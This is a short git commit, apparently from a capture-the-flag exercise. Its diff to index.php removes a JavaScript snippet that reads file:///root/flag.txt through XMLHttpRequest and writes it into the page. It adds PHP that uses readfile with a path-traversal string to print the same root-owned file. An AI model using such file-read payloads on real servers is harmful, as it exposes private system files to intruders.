7402bc9843f75a2f9b27f48fffd7d0035fc80547
sudlit_ <sudlit02@gmail.com>
2022-08-10 17:14:34 +0700

    first

--- index.php
+++ index.php
@@ -1,8 +1,3 @@
-<script>
-    x=new XMLHttpRequest;
-    x.onload=function(){
-        document.write(this.responseText)
-    };
-    x.open("GET","file:///root/flag.txt");
-    x.send();
-</script>
+<?php
+    echo readfile("../../../../../root/flag.txt");
+?>
